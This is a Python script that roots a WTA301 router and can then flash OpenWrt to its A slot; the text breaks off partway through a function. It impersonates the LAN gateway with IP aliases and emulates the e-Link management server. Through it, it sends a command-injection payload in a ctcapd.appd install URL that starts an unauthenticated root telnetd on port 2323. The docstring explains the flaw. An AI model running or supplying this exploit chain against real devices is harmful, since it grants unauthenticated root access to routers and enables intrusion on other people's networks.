#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
wta301-getroot.py —— 一键在原厂固件上取得 root，并可继续刷入 OpenWrt（A 槽）

用法：
    python wta301-getroot.py                                  # 只取 root
    python wta301-getroot.py --flash-op PKG.bin               # 取完 root 刷 OpenWrt 到 A 槽
    python wta301-getroot.py --flash-op PKG.bin --dry-run     # 只打印计划，不写入

依赖：Python 3.8+，同目录或 ../work/net 下有 srv.py 与 elink_gw4.py（纯 stdlib + cryptography）
权限：必须管理员（Windows）/ root（Linux）—— 要加 IP 别名与放行入站端口

原理（已实测，见 docs/GETROOT-AND-NORMAL-USER-FLASH.md）：
    设备上的 elinkclt 周期性反连「网关」的 32768 端口。只要该网关地址在 LAN 上
    没人占，给本机加一个 /32 别名就合法地成了它的网关。握手 DH128 + AES-128-CBC
    （magic 0x3f721fb5），随后下发
        ubus_call ctcapd.appd install {"url": "http://<PC>:8099/x;(<cmd>);"}
    appd 用 asprintf 拼 `wget <url>` 再 popen，URL 未过滤 ';' ⇒ 命令注入。
    注入的 telnetd 以 root 跑 ⇒ telnet <设备>:2323 直接是 uid=0。

═══════════════════════════════════════════════════════════════════════════
★★★ 分区表 —— 最容易搞死的地方 ★★★
═══════════════════════════════════════════════════════════════════════════

原厂固件和我们的 OpenWrt，mtd 名字**完全一样**，但指向**完全相反**：

    绝对偏移     原厂叫法            我们的 OpenWrt 叫法
    0x0700000    normal_boot         normal_boot_bak
    0x0880000    kernel              kernel_bak          ← 原厂主槽，本脚本永不写
    0x0fc0000    rootfs              rootfs_bak          ← 原厂主槽，本脚本永不写
    0x4700000    normal_boot_bak     normal_boot
    0x4800000    firmware_bak 容器   （不建模）
    0x4880000    kernel_bak          kernel              ★ OpenWrt 内核
    0x4fc0000    rootfs_bak          rootfs              ★ OpenWrt 根文件系统

⇒ **绝对不能按名字找分区**。唯一可靠判据是 `uname -r`：
      4.4.x   → 原厂，A 槽 = kernel_bak / rootfs_bak
      6.x     → 我们的 OpenWrt，A 槽 = kernel / rootfs

★★★ 第二道陷阱：原厂 mtd10 只有 4 MiB，装不下 OpenWrt 内核 ★★★

    OpenWrt 内核 FIT totalsize = 0x41526c (4,280,940)
    原厂  mtd10 "kernel_bak"   = 0x400000 (4,194,304)   ← 差 0x1526c，会被截断

    但原厂还有一个 **容器分区** mtd13 "firmware_bak" = 0x4800000 起、0x2620000 长，
    它完整覆盖 A 槽。容器内实测映射（dd + hexdump 逐字节核对过）：

        +0x00000  TP 槽头    00 00 01 00 55 aa 9d d1
        +0x80000  kernel     d0 0d fe ed  (FIT)
        +0x7C0000 rootfs     68 73 71 73  (hsqs)

    ⇒ 内核走 mtd13 并 `seek=4`（0x80000 / 0x20000），绕开 4 MiB 限制。
      原厂下 rootfs 直接写 mtd11（12 MiB，够 11.75 MiB）。
      这两条路径都用 dd 的 skip（源）+ seek（目标）表达，不做任何复制拼接。

为什么放 A 槽：我们的 kit 的 tpimg_boot_slot() **先试 image_2（A 槽头 0x4800000）**，
失败才试 image_1（B 槽头 0x800000）。所以 OpenWrt 放 A 槽即可被拉起，
**不需要动 boot_flag、不需要动任何 u-boot、不碰原厂主槽**。

A 槽头几何（0x4800000）实测：
    +0x58 = 0x04880000  kernel 偏移
    +0x5c = 0x00480000  kernel 长度 (4.5 MiB)   ← 足以容纳 0x41526c
kit 只读这两个字段，**不验 md5**，所以写内核不需要改槽头，也不需要改 md5。

═══════════════════════════════════════════════════════════════════════════
★★★ 第三个陷阱：两种固件的 overlay 在不同的地方 ★★★
═══════════════════════════════════════════════════════════════════════════

“分区名字互为上下”只在【运行时 dd】时才害人；走到启动阶段，
两种内核各带各的分区映射，而 overlay 更是物理分离的：

    固件        mtd     起址        长度      终点        说明
    原厂        mtd7    0x6a00000  0x1600000  0x8000000   ubi.mtd=7（内核 cmdline 写死）
    原厂        mtd12   0x6a00000  0x1600000  0x8000000   rootfs_data_bak，就是同一块
    我们        mtd12   0x1bc0000  0x2440000  0x4000000   ubi.mtd=rootfs_data3，卷名 wta301data

    [0x1bc0000, 0x4000000) 与 [0x6a00000, 0x8000000) 不重叠。

⇒ **两个固件的设置互不干扰**。切到 OpenWrt 就挂 OpenWrt 那份 overlay，
  切回原厂就挂原厂那份，两边各自的 Wi-Fi/密码/包都保留。

⇒ **本脚本默认不碰任何 overlay**（两个区域都在写入目标之外）。
  只有你显式加 `--reset-overlay stock|openwrt` 才会擦。

⚠️ 历史坑：早期版本的 OpenWrt 把 overlay 放在 0x6a00000（和原厂撞车），
写了 w5/r0 格式的 UBIFS；原厂 4.4.60 只支持 w4/r0，于是挂不上、
退回 ramdisk、/proc 全灭。现在 DTS 已改到 0x1bc0000。
如果看到原厂 `/proc/mtd` 缺失，就 `--reset-overlay stock` 擦掉 0x6a00000，
原厂下次启动会自己重建 w4（已实测）。
"""

from __future__ import annotations

import argparse
import hashlib
import json
import os
import platform
import socket
import subprocess
import sys
import threading
import time

# ---------------------------------------------------------------------------
# 常量
# ---------------------------------------------------------------------------

ELINK_PORT = 32768
SRV_PORT = 8099

# OpenWrt 完整包布局（实测 wta301-op-25.12.6-p29.bin，总长 0x1060000）
#   0x000000  头 0x20000
#   0x020000  FIT 内核区 0x480000（FIT 实占 0x41526c，其余 0xFF）
#   0x4a0000  squashfs 0xBC0000 至 EOF
PKG_KERNEL_OFF = 0x020000
PKG_KERNEL_LEN = 0x480000
PKG_ROOTFS_OFF = 0x4a0000
PKG_ROOTFS_LEN = 0xBC0000
PKG_TOTAL = 0x1060000

DD_BS = 0x20000  # 128 KiB；上述所有偏移与长度都是它的整数倍

# 各 mtd 的 flash 绝对起始（用于换算 dd seek → 绝对地址，做重叠检查）
MTD_ABS = {
    4: 0x4700000, 5: 0x4880000, 6: 0x4FC0000, 7: 0x6A00000,
    8: 0x4800000, 9: 0x700000, 10: 0x880000, 11: 0xFC0000,
    12: 0x1BC0000, 13: 0x4800000, 14: 0x4000000,
}

# 某些落点的 mtd 编号在不同固件下语义不同，显式登记 (mtd, seek) → 由 MTD_ABS 换算
FLASH_ABS = {}


# 各固件下的 A 槽落点。
#   src_skip  : 在包内的块偏移（内核 1 块 = 0x20000；rootfs 37 块 = 0x4a0000）
#   dst_mtd   : 目标 mtdblock 编号
#   dst_seek  : 在该分区内的块偏移
#   max_len   : 该落点能容纳的字节数（硬上限，超过就拒绝写）
FLASH_TARGETS = {
    "stock": {
        # 内核必须走 firmware_bak 容器，因为 kernel_bak 只有 4 MiB
        "kernel": {"dst_mtd": 13, "dst_seek": 4, "max_len": 0x480000,
                   "why": "firmware_bak 容器 +0x80000（kernel_bak 只有 4MiB，装不下 0x41526c）"},
        "rootfs": {"dst_mtd": 11, "dst_seek": 0, "max_len": 0xC00000,
                   "why": "rootfs_bak 直接写"},
    },
    "openwrt": {
        "kernel": {"dst_mtd": 5, "dst_seek": 0, "max_len": 0x740000,
                   "why": "kernel 分区（我们的 DTS 给了 7.25MiB）"},
        "rootfs": {"dst_mtd": 6, "dst_seek": 0, "max_len": 0xC00000,
                   "why": "rootfs 分区"},
    },
}

# 绝不触碰（原厂主槽 + 引导链）+ overlay 保护区。脚本在写之前会核对每个落点。
NEVER_WRITE = [
    (0x0000000, 0x03C0000, "factory_boot（一级 u-boot / TTL 命脉）"),
    (0x0400000, 0x0020000, "factory_info"),
    (0x0480000, 0x0020000, "art"),
    (0x0700000, 0x0040000, "u-boot B 槽"),
    (0x0880000, 0x0400000, "原厂主槽 kernel"),
    (0x0FC0000, 0x0C00000, "原厂主槽 rootfs"),
    (0x4000000, 0x0020000, "boot_flag"),
]

# 两种固件各自的 overlay（可写数据区）。物理分离，互不干扰。
OVERLAYS = {
    "stock":   {"start": 0x6A00000, "len": 0x1600000, "name": "mtd7 rootfs_data",
                "mtd": 7, "ubi_volume": "(无卷名，ubi.mtd=7)",
                "why": "原厂内核 cmdline 写死 ubi.mtd=7；只认 w4/r0 UBIFS"},
    "openwrt": {"start": 0x1BC0000, "len": 0x2440000, "name": "mtd12 rootfs_data3",
                "mtd": 12, "ubi_volume": "wta301data",
                "why": "bootargs-append 里 ubi.mtd=rootfs_data3 fstools_overlay_name=wta301data"},
}


def overlay_of(fw):
    o = OVERLAYS[fw]
    return o["start"], o["start"] + o["len"], o


def overlaps(a0, a1, b0, b1):
    return a0 < b1 and a1 > b0


# ---------------------------------------------------------------------------
# 输出
# ---------------------------------------------------------------------------

def _utf8_stdout():
    """Windows 控制台默认 GBK，输出中文会成乱码；统一成 UTF-8。"""
    for stream in (sys.stdout, sys.stderr):
        try:
            stream.reconfigure(encoding="utf-8", errors="replace")
        except (AttributeError, ValueError):
            pass


def die(msg, code=1):
    print("!! " + msg, file=sys.stderr, flush=True)
    sys.exit(code)


def info(msg=""):
    print(msg, flush=True)


def _run(cmd, quiet=True):
    r = subprocess.run(cmd, shell=isinstance(cmd, str), capture_output=True)
    out = (r.stdout + r.stderr).decode("utf-8", "replace").strip()
    if not quiet and out:
        info("   $ %s -> %s" % (cmd if isinstance(cmd, str) else " ".join(cmd), out[:200]))
    return r.returncode, out


# ---------------------------------------------------------------------------
# 阶段 1：让本机冒充网关
# ---------------------------------------------------------------------------

def iface_index(ip_hint):
    code, out = _run(["powershell", "-NoProfile", "-Command",
                      "Get-NetIPAddress -AddressFamily IPv4 | "
                      "Where-Object {$_.IPAddress -eq '%s'} | "
                      "Select-Object -ExpandProperty InterfaceIndex" % ip_hint])
    for tok in out.split():
        if tok.isdigit():
            return int(tok)
    return None


def setup_alias(addrs, pc_ip):
    """加网关地址的 /32 别名；返回清理函数。"""
    system = platform.system()
    added = []

    if system == "Windows":
        idx = iface_index(pc_ip)
        if idx is None:
            die("找不到地址为 %s 的网卡。先 ipconfig 确认有线口 IP，再 --pc-ip 指定。" % pc_ip)
        info("   网卡 InterfaceIndex=%d（持有 %s）" % (idx, pc_ip))
        for a in addrs:
            rc, out = _run(["powershell", "-NoProfile", "-Command",
                            "New-NetIPAddress -InterfaceIndex %d -IPAddress %s "
                            "-PrefixLength 32 -SkipAsSource $true -ErrorAction Stop"
                            % (idx, a)])
            if rc != 0 and not ("already exists" in out.lower() or "已存在" in out):
                info("   ! 别名 %s 未加成功：%s" % (a, out[:160]))
            else:
                added.append(a)
                info("   + 别名 %s/32 (SkipAsSource)" % a)
        for name, port in (("WTA_ELINK", ELINK_PORT), ("WTA_SRV", SRV_PORT)):
            _run("netsh advfirewall firewall add rule name=%s dir=in action=allow "
                 "protocol=TCP localport=%d" % (name, port))
            info("   + 防火墙放行 TCP %d (%s)" % (port, name))

        def cleanup():
            for a in added:
                _run(["powershell", "-NoProfile", "-Command",
                      "Remove-NetIPAddress -IPAddress %s -PrefixLength 32 "
                      "-Confirm:$false -ErrorAction SilentlyContinue" % a])
                info("   - 删除别名 %s" % a)
            for name in ("WTA_ELINK", "WTA_SRV"):
                _run("netsh advfirewall firewall delete rule name=%s" % name)
            info("   - 删除防火墙规则")
        return cleanup

    dev = _default_dev()
    for a in addrs:
        rc, out = _run(["ip", "addr", "add", "%s/32" % a, "dev", dev])
        if rc == 0:
            added.append((a, dev))
            info("   + 别名 %s/32 @ %s" % (a, dev))
        else:
            info("   ! 别名 %s 未加成功：%s" % (a, out[:120]))

    def cleanup_linux():
        for a, d in added:
            _run(["ip", "addr", "del", "%s/32" % a, "dev", d])
            info("   - 删除别名 %s" % a)
    return cleanup_linux


def _default_dev():
    code, out = _run("ip route show default")
    parts = out.split()
    return parts[parts.index("dev") + 1] if "dev" in parts else None


# ---------------------------------------------------------------------------
# 阶段 2：e-Link 模拟器 + HTTP 服务（必须与轮询同进程）
# ---------------------------------------------------------------------------

HERE = os.path.dirname(os.path.abspath(__file__))


def find_script(name):
    for cand in (os.path.join(HERE, name),
                 os.path.join(HERE, "..", "net", name),
                 os.path.join(HERE, "..", "work", "net", name)):
        if os.path.exists(cand):
            return os.path.abspath(cand)
    return None


class Servers:
    """把 HTTP 服务、e-Link 模拟器、轮询放进【同一进程】。

    这是本项目最关键的运维约束：终端/SSH 会话一结束，该会话派生的整个进程树
    都会被回收（Windows 上 sshd 用 job object 管理），DETACHED_PROCESS 也救不了。
    服务器进程必须与「等待回连」的循环同生共死。见 lesson sqbjop6。
    """

    def __init__(self, target_ip, pc_ip, payload, serve_dir, lifetime):
        self.target_ip = target_ip
        self.pc_ip = pc_ip
        self.payload = payload
        self.serve_dir = serve_dir
        self.lifetime = lifetime
        self.procs = []

    def start(self):
        srv = find_script("srv.py")
        elink = find_script("elink_gw4.py")
        if not srv or not elink:
            die("找不到 srv.py / elink_gw4.py。\n"
                "    把这两个文件放在本脚本同目录，或 仓库的 work/net/ 下。")

        env = dict(os.environ)
        env.update({"ELINK_PORT": str(ELINK_PORT), "SRV_PORT": str(SRV_PORT),
                    "WTA_HOST": self.target_ip, "SPOOF": "192.168.0.1",
                    "PC_IP": self.pc_ip})

        os.makedirs(self.serve_dir, exist_ok=True)
        with open(os.path.join(self.serve_dir, "x"), "w") as f:
            f.write("ok\n")

        def spawn(name, args):
            log = open(os.path.join(self.serve_dir, name + ".log"), "wb")
            p = subprocess.Popen([sys.executable] + args,
                                 cwd=os.path.dirname(srv), env=env,
                                 stdout=log, stderr=subprocess.STDOUT,
                                 stdin=subprocess.DEVNULL)
            info("   + %-6s pid=%d" % (name, p.pid))
            self.procs.append(p)
            return p

        self.srv = spawn("srv", [srv, "--root", self.serve_dir, "--port", str(SRV_PORT)])
        time.sleep(1.0)
        self.elink = spawn("elink", [elink, str(self.lifetime), "ctcapd.appd",
                                     "install", json.dumps({"url": self.payload})])
        time.sleep(2.0)
        info("   + payload: %s" % self.payload)

    def alive(self):
        return bool(self.procs) and all(p.poll() is None for p in self.procs)

    def stop(self):
        for p in self.procs:
            try:
                p.terminate()
            except Exception:
                pass


def wait_for_root(ip, servers, timeout):
    info("")
    info("[3] 等设备自己回连（周期是秒级，不要碰它）")
    t0 = time.time()
    last = 0.0
    while time.time() - t0 < timeout:
        s = socket.socket()
        s.settimeout(1.5)
        rc = s.connect_ex((ip, 2323))
        s.close()
        el = time.time() - t0
        if rc == 0:
            info("   *** 2323 OPEN  t=%.0fs ***" % el)
            return True
        if not servers.alive():
            info("   ! 监听进程已退出，重启（计时重置）")
            servers.stop()
            servers.start()
            t0 = time.time()
            continue
        if el - last >= 30:
            info("   [%3.0fs] 仍在等…（监听正常）" % el)
            last = el
        time.sleep(2)
    return False


# ---------------------------------------------------------------------------
# 阶段 3：telnet 会话
# ---------------------------------------------------------------------------

class Telnet:
    def __init__(self, ip, port=2323, timeout=12):
        self.s = socket.create_connection((ip, port), timeout)
        self.s.settimeout(timeout)
        time.sleep(1.0)
        try:
            self.s.recv(8192)
        except Exception:
            pass

    def sh(self, cmd, wait=2.0):
        self.s.sendall(cmd.encode() + b"\n")
        time.sleep(wait)
        buf = b""
        self.s.settimeout(2.0)
        try:
            while True:
                d = self.s.recv(65535)
                if not d:
                    break
                buf += d
        except Exception:
            pass
        return buf.decode("utf-8", "replace").replace("\r", "")

    def close(self):
        try:
            self.s.close()
        except Exception:
            pass


def detect_firmware(tn):
    """用内核版本判定固件，返回 ('stock'|'openwrt'|None, ver)。"""
    out = tn.sh("uname -r", 1.8)
    ver = ""
    for line in out.splitlines():
        line = line.strip()
        if line and not line.startswith("uname") and any(c.isdigit() for c in line):
            ver = line
            break
    info("   内核: %s" % (ver or "(未知)"))
    if ver.startswith("4.4."):
        return "stock", ver
    if ver.startswith("6."):
        return "openwrt", ver
    return None, ver


def read_mtd(tn):
    out = tn.sh("cat /proc/mtd", 2.2)
    table = {}
    for line in out.splitlines():
        line = line.strip()
        if not line.startswith("mtd"):
            continue
        parts = line.split()
        try:
            table[int(parts[0][3:].rstrip(":"))] = (int(parts[1], 16),
                                                    parts[3].strip('"'))
        except (IndexError, ValueError):
            continue
    return table


def md5_of_pkg_slice(data, off, length):
    return hashlib.md5(data[off:off + length]).hexdigest()


# ---------------------------------------------------------------------------
# 阶段 4：刷写
# ---------------------------------------------------------------------------

def build_plan(pkg_path, fw, mtd_table):
    """算出 dd 参数并做全部安全检查。返回 (plan, problems)。"""
    tgts = FLASH_TARGETS[fw]
    problems = []
    data = open(pkg_path, "rb").read()

    if len(data) != PKG_TOTAL:
        problems.append("包大小 0x%x，期望 0x%x" % (len(data), PKG_TOTAL))
        return None, problems

    plan = {"pkg": pkg_path, "pkg_md5": hashlib.md5(data).hexdigest(),
            "parts": {}}

    for part, src_off, src_len in (
            ("kernel", PKG_KERNEL_OFF, PKG_KERNEL_LEN),
            ("rootfs", PKG_ROOTFS_OFF, PKG_ROOTFS_LEN)):
        t = tgts[part]
        mtd = t["dst_mtd"]
        if mtd not in mtd_table:
            problems.append("%s: mtd%d 不存在" % (part, mtd))
            continue
        size, name = mtd_table[mtd]

        # 目标分区内可用长度 = 分区大小 - 目标内偏移
        avail = size - t["dst_seek"] * DD_BS
        if avail <= 0:
            problems.append("%s: mtd%d(%s) seek 越界" % (part, mtd, name))
            continue

        want = min(src_len, t["max_len"], avail)
        blocks = want // DD_BS
        if blocks == 0:
            problems.append("%s: 可用空间不足一个块" % part)
            continue

        need = src_len
        if blocks * DD_BS < need:
            # 内核可能被截断；只有 FIT 自身放得下才允许
            info("   ! %s 落点只有 0x%x，包内是 0x%x → 写 0x%x"
                 % (part, avail, src_len, blocks * DD_BS))

        plan["parts"][part] = {
            "mtd": mtd, "name": name, "why": t["why"],
            "src_skip": src_off // DD_BS, "dst_seek": t["dst_seek"],
            "count": blocks, "bytes": blocks * DD_BS,
            "md5": md5_of_pkg_slice(data, src_off, blocks * DD_BS),
        }

        # 安全检查：写入区间不得与任何一方的 overlay 重叠
        # （内核走 mtd13 容器，offset 0 不代表 flash 绝对地址，需要换算）
        abs_start = FLASH_ABS.get((fw, part), (mtd, t["dst_seek"]))
        if isinstance(abs_start, tuple):
            base_mtd, seek = abs_start
            base = MTD_ABS.get(base_mtd)
            if base is not None:
                a0 = base + seek * DD_BS
                a1 = a0 + blocks * DD_BS
                for ofw, o in OVERLAYS.items():
                    if overlaps(a0, a1, o["start"], o["start"] + o["len"]):
                        problems.append(
                            "%s 写入 [0x%07x,0x%07x) 撞上 %s 的 overlay [0x%07x,0x%07x)"
                            % (part, a0, a1, ofw, o["start"], o["start"] + o["len"]))

    # 内核完整性硬校验：FIT totalsize 必须落在实际写入的字节内
    if "kernel" in plan["parts"]:
        import struct
        fit_tot = struct.unpack(">I", data[PKG_KERNEL_OFF + 4:PKG_KERNEL_OFF + 8])[0]
        written = plan["parts"]["kernel"]["bytes"]
        info("   FIT totalsize 0x%x，实写 0x%x → %s"
             % (fit_tot, written, "OK" if fit_tot <= written else "截断 !!"))
        if fit_tot > written:
            problems.append("FIT 0x%x 超过实写 0x%x，会被截断，拒绝执行"
                            % (fit_tot, written))

    return plan, problems


def print_plan(plan):
    info("")
    info("[5] 刷写计划")
    for part in ("kernel", "rootfs"):
        if part not in plan["parts"]:
            continue
        p = plan["parts"][part]
        info("   %-6s → mtd%-2d (%-13s) src_skip=%-3d dst_seek=%-3d count=%-3d (0x%07x)"
             % (part, p["mtd"], p["name"], p["src_skip"], p["dst_seek"],
                p["count"], p["bytes"]))
        info("           md5=%s" % p["md5"])
        info("           理由: %s" % p["why"])
    info("   整包 md5 = %s" % plan["pkg_md5"])
    info("")
    info("   overlay 归属（本脚本不碰，两固件各自保留设置）:")
    for fw2, o in OVERLAYS.items():
        info("     %-8s %-16s 0x%07x..0x%07x (%.0f MiB)  %s"
             % (fw2, o["name"], o["start"], o["start"] + o["len"],
                o["len"] / 1048576.0, o["ubi_volume"]))


def do_flash(tn, plan, pc_ip, pkg_name):
    url = "http://%s:%d/%s" % (pc_ip, SRV_PORT, pkg_name)

    info("")
    info("[6] 设备侧下载镜像")
    out = tn.sh("cd /tmp && wget -O pkg.bin '%s' 2>&1 | tail -3" % url, 15.0)
    info("   " + out.strip().replace("\n", "\n   ")[:300])
    got = _first_md5(tn.sh("md5sum /tmp/pkg.bin", 10.0))
    info("   设备侧整包 md5 = %s" % (got or "(读取失败)"))
    if got != plan["pkg_md5"]:
        die("整包 md5 不一致，中止（尚未写入任何分区）\n"
            "    期望 %s\n    实得 %s" % (plan["pkg_md5"], got))

    for part in ("kernel", "rootfs"):
        if part not in plan["parts"]:
            continue
        p = plan["parts"][part]
        info("")
        info("[7] 写 %s → /dev/mtdblock%d (%s)" % (part, p["mtd"], p["name"]))
        cmd = ("dd if=/tmp/pkg.bin of=/dev/mtdblock%d bs=%d skip=%d seek=%d count=%d 2>&1"
               % (p["mtd"], DD_BS, p["src_skip"], p["dst_seek"], p["count"]))
        out = tn.sh(cmd, 40.0 if part == "kernel" else 90.0)
        info("   " + out.strip().replace("\n", "\n   ")[:260])

    tn.sh("sync", 3.0)

    info("")
    info("[8] 回读校验（从分区读回算 md5，与包内切片比）")
    ok = True
    for part in ("kernel", "rootfs"):
        if part not in plan["parts"]:
            continue
        p = plan["parts"][part]
        cmd = ("dd if=/dev/mtdblock%d bs=%d skip=%d count=%d 2>/dev/null | md5sum"
               % (p["mtd"], DD_BS, p["dst_seek"], p["count"]))
        got = _first_md5(tn.sh(cmd, 35.0))
        good = (got == p["md5"])
        ok = ok and good
        info("   %-6s 期望 %s  实得 %s  %s"
             % (part, p["md5"], got or "(失败)", "OK" if good else "MISMATCH"))

    return ok


def _first_md5(text):
    for line in text.splitlines():
        tok = line.strip().split()
        if tok and len(tok[0]) == 32 and all(c in "0123456789abcdefABCDEF" for c in tok[0]):
            return tok[0].lower()
    return ""


# ---------------------------------------------------------------------------
# main
# ---------------------------------------------------------------------------

def main():
    _utf8_stdout()

    argv = sys.argv[1:]
    interactive = not argv or argv[0] in ("-i", "--interactive", "menu")
    if not interactive:
        return run_cli(argv)

    # ---------------- 傻瓜式菜单 ----------------
    info("=" * 68)
    info("   WTA301 刷机工具")
    info("=" * 68)
    info("")
    info("   开始前确认：")
    info("     1. 板子已上电，用网线接它的 LAN 口（不是 WAN）")
    info("     2. 板子在【原厂固件】状态（第一次刷机需要）")
    info("     3. 本程序要用管理员权限跑")
    info("")
    info("   全程只动 A 槽，B 槽保留原厂做回退。")
    info("")
    info("   请选择：")
    info("")
    info("     [1] 只获取 root（不刷任何东西）")
    info("     [2] 刷 OpenWrt（完整包）")
    info("     [3] 只刷 u-boot kit（保留当前固件）")
    info("     [4] 查看分区表与风险说明")
    info("     [0] 退出")
    info("")

    try:
        choice = input("   输入序号: ").strip()
    except (EOFError, KeyboardInterrupt):
        info("")
        return 0

    if choice == "0" or choice == "":
        return 0
    if choice == "4":
        info("")
        info(__doc__)
        return 0

    if choice == "1":
        return run_cli(["--interactive-ok"])

    if choice == "2":
        pkg = ask_file("OpenWrt 完整包", "wta301-op-*.bin", PKG_TOTAL)
        if not pkg:
            return 1
        return run_cli(["--flash-op", pkg, "--interactive-ok"])

    if choice == "3":
        pkg = ask_file("u-boot kit 镜像", "wta301-uboot-*.bin", 0x40000)
        if not pkg:
            return 1
        return run_cli(["--flash-uboot", pkg, "--interactive-ok"])

    info("   ! 无效选项")
    return 1


def ask_file(label, pattern, expect_size):
    """让用户拖入/输入文件路径，并校验大小。"""
    info("")
    info("   请把 %s 拖到窗口里（或将路径粘入），回车：" % label)
    info("   文件名形如 %s" % pattern)
    try:
        path = input("   路径: ").strip().strip('"').strip("'")
    except (EOFError, KeyboardInterrupt):
        info("")
        return None
    if not path:
        return None
    if not os.path.exists(path):
        info("   ! 文件不存在: %s" % path)
        return None
    size = os.path.getsize(path)
    if expect_size and size != expect_size:
        info("   ! 文件大小 0x%x，期望 0x%x" % (size, expect_size))
        if not expect_size:
            pass
        return None
    info("   OK: %s (0x%x)" % (os.path.basename(path), size))
    return path


# ---------------------------------------------------------------------------
# CLI 入口
# ---------------------------------------------------------------------------

def run_cli(argv):
    ap = argparse.ArgumentParser(
        prog="wta301-getroot.py",
        description="一键在原厂固件上取 root；可选继续刷 OpenWrt 或 u-boot kit 到 A 槽",
        epilog="不带参数运行 = 傻瓜式菜单。带参数则走命令行。\n"
               "分区表与陷阱说明用 --explain 查看。")
    ap.add_argument("--target", default=None, help="设备 IP（默认扫 192.168.1.0/24）")
    ap.add_argument("--pc-ip", default=None, help="本机有线口 IP（默认按路由探测）")
    ap.add_argument("--timeout", type=int, default=900, help="等回连秒数，默认 900")
    ap.add_argument("--flash-op", metavar="PKG", default=None,
                    help="取到 root 后把该 OpenWrt 完整包刷进 A 槽")
    ap.add_argument("--flash-uboot", metavar="BIN", default=None,
                    help="只刷 u-boot kit 到 A 槽（保留当前固件）")
    ap.add_argument("--dry-run", action="store_true", help="只打印计划，不写入")
    ap.add_argument("--keep", action="store_true", help="保留 IP 别名与防火墙规则")
    ap.add_argument("--serve-dir", default=None, help="HTTP 服务根目录")
    ap.add_argument("--reset-overlay", choices=("stock", "openwrt"), default=None,
                    metavar="{stock,openwrt}",
                    help="同时擦除指定固件的 overlay（默认不碰）")
    ap.add_argument("--explain", action="store_true", help="打印分区表与陷阱后退出")
    ap.add_argument("--yes", "-y", action="store_true", help="不等确认，直接执行")
    # 内部用：菜单跳过 argparse 的必填校验
    argv = [a for a in argv if a != "--interactive-ok"]
    args = ap.parse_args(argv)

    if args.explain:
        info(__doc__)
        return 0
    if not args.flash_op and not args.flash_uboot:
        pass  # 只取 root
    if args.flash_op and args.flash_uboot:
        die("--flash-op 与 --flash-uboot 只能选一个")

    return execute(args)


def execute(args):
    _utf8_stdout()

    if args.flash_op:
        what = "  +  刷入 OpenWrt(A 槽)"
    elif args.flash_uboot:
        what = "  +  刷入 u-boot kit(A 槽)"
    else:
        what = ""

    info("=" * 68)
    info(" WTA301 一键 getroot" + what)
    info("=" * 68)

    target = args.target
    if not target:
        info("")
        info("[0] 扫描 192.168.1.0/24 …")
        target = scan_target()
        if not target:
            die("没扫到设备。请用 --target <设备IP> 指定。")
    info("   设备: %s" % target)

    pc_ip = args.pc_ip or detect_pc_ip(target)
    if not pc_ip:
        die("探测不到本机有线口 IP，请用 --pc-ip 指定。")
    info("   本机: %s" % pc_ip)

    gw_ip = target.rsplit(".", 1)[0] + ".1"
    info("")
    info("[1] 冒充网关（加 %s 与 192.168.0.1 的 /32 别名）" % gw_ip)
    cleanup = setup_alias(sorted({gw_ip, "192.168.0.1"}), pc_ip)

    serve_dir = args.serve_dir or os.path.join(
        os.environ.get("TEMP") or "/tmp", "wta301-getroot")
    os.makedirs(serve_dir, exist_ok=True)

    pkg_name = None
    payload_path = None
    if args.flash_op:
        payload_path = _stage_file(args.flash_op, serve_dir, PKG_TOTAL, "完整包")
        pkg_name = os.path.basename(payload_path)
    elif args.flash_uboot:
        payload_path = _stage_file(args.flash_uboot, serve_dir, 0x40000, "u-boot kit")
        pkg_name = os.path.basename(payload_path)
    if payload_path:
        info("   镜像: %s (0x%x)" % (pkg_name, os.path.getsize(payload_path)))

    payload = "http://%s:%d/x;(/bin/busybox telnetd -l /bin/sh -p 2323 >/dev/null 2>&1 &);" \
              % (pc_ip, SRV_PORT)

    info("")
    info("[2] 起 e-Link 模拟器 + HTTP 服务（同进程，退出即失效）")
    servers = Servers(target, pc_ip, payload, serve_dir, args.timeout + 600)
    servers.start()

    rc = 0
    try:
        if not wait_for_root(target, servers, args.timeout):
            info("")
            info("!! %d 秒内设备没回连。排查：" % args.timeout)
            info("   1) 设备是否在原厂固件、是否在正常运行")
            info("   2) 是否以管理员/root 运行（别名与防火墙要权限）")
            info("   3) %s 是否真的没有别的机器占用" % gw_ip)
            rc = 2
        else:
            info("")
            info("[4] 连上 root shell")
            tn = Telnet(target)
            info("   " + tn.sh("id", 1.5).strip().replace("\n", " ")[:110])

            fw, ver = detect_firmware(tn)
            if not fw:
                info("   ! 无法判定固件类型（内核 %s），中止以免写错分区" % ver)
                rc = 3
            else:
                info("   固件类型: %s" % fw)
                mtd = read_mtd(tn)
                info("   /proc/mtd 读到 %d 个分区" % len(mtd))

                if args.flash_op:
                    rc = flash_op(tn, args, fw, mtd, pc_ip, pkg_name)
                elif args.flash_uboot:
                    rc = flash_uboot(tn, args, fw, mtd, pc_ip, pkg_name)
                else:
                    info("")
                    info("   分区表（仅供核对，未写入任何东西）:")
                    for idx in sorted(mtd):
                        size, name = mtd[idx]
                        info("     mtd%-2d %-18s 0x%08x" % (idx, name, size))
                    info("")
                    info("   已取得 root。要刷东西就加 --flash-op <完整包> 或 --flash-uboot <kit>")
            tn.close()
    finally:
        servers.stop()
        if args.keep:
            info("")
            info("[清理] --keep：保留别名与防火墙规则（记得手工删）")
        else:
            info("")
            info("[清理] 撤销本机改动")
            cleanup()

    info("")
    info("=" * 68)
    info(" 退出码 %d —— %s" % (rc, "成功" if rc == 0 else "失败"))
    info("=" * 68)
    return rc


def _stage_file(path, serve_dir, expect_size, label):
    p = os.path.abspath(path)
    if not os.path.exists(p):
        die("找不到 %s: %s" % (label, p))
    size = os.path.getsize(p)
    if size != expect_size:
        die("%s 大小 0x%x，期望 0x%x" % (label, size, expect_size))
    dst = os.path.join(serve_dir, os.path.basename(p))
    if os.path.abspath(dst) != p:
        info("   复制镜像到服务目录…")
        with open(p, "rb") as f, open(dst, "wb") as g:
            while True:
                b = f.read(1 << 20)
                if not b:
                    break
                g.write(b)
    return dst


# ---------------------------------------------------------------------------
# 刷 OpenWrt
# ---------------------------------------------------------------------------

def flash_op(tn, args, fw, mtd_table, pc_ip, pkg_name):
    plan, problems = build_plan(os.path.join(
        args.serve_dir or os.path.join(os.environ.get("TEMP") or "/tmp", "wta301-getroot"),
        pkg_name), fw, mtd_table)
    if problems:
        for p in problems:
            info("   !! " + p)
        return 4
    print_plan(plan)
    if args.reset_overlay:
        _do_reset_overlay(tn, args, fw, mtd_table)
    if args.dry_run:
        info("")
